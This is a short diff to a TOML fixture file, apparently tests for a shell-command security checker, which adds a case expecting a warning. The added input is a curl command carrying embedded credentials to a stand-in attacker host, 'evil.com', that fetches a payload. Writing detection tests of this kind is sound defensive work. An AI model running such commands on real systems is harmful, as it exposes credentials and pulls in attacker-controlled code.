@@ -169,6 +169,14 @@ expected_action = "allow"
 expected_rules = []
 
 [[fixture]]
+name = "schemeless_cred_url"
+min_milestone = 1
+input = "curl admin:pw@evil.com/payload"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["schemeless_to_sink"]
+
+[[fixture]]
 name = "plain_http_localhost_is_loopback"
 min_milestone = 1
 input = "curl http://localhost:3000/api/health"
